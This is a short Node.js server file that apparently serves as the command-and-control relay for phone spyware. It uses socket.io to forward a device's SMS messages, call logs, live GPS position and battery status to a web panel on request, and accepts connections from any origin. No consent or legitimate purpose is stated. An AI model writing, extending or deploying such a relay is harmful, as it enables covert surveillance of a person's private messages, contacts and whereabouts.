const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
    // Battery & SMS (Existing)
    socket.on('battery-status', (data) => socket.broadcast.emit('ui-battery', data));
    socket.on('get-sms-request', () => socket.broadcast.emit('get-sms-request'));
    socket.on('sms-data-log', (data) => socket.broadcast.emit('ui-sms-display', data));

    // [NEW: Call Log Forwarding]
    socket.on('get-calls-request', () => socket.broadcast.emit('get-calls-request'));
    socket.on('call-log-data', (data) => socket.broadcast.emit('ui-calls-display', data));

    // [NEW: GPS Forwarding]
    socket.on('gps-update', (data) => socket.broadcast.emit('ui-gps', data));

    socket.on('disconnect', () => socket.broadcast.emit('device-status', { online: false }));
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => console.log(`Server Active on ${PORT}`));
